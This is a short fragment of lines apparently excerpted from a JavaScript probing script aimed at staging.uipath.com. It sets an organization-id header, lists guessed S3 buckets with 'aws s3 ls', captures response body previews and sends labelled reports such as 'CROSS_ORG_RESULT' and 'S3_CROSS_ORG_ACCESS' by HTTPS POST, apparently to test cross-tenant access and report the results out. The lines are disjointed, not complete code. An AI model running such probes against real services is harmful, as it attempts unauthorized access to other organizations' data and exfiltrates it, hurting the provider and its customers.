hostname: 'staging.uipath.com'
X-UIPATH-OrganizationId
content_preview: body.substring(0, 200)
report('CROSS_ORG_RESULT'
aws s3 ls s3://${potentialBucket}
report('S3_CROSS_ORG_ACCESS'
const req = https.request(
method: 'POST'
testCrossOrgAccess();
testSharedStorage();
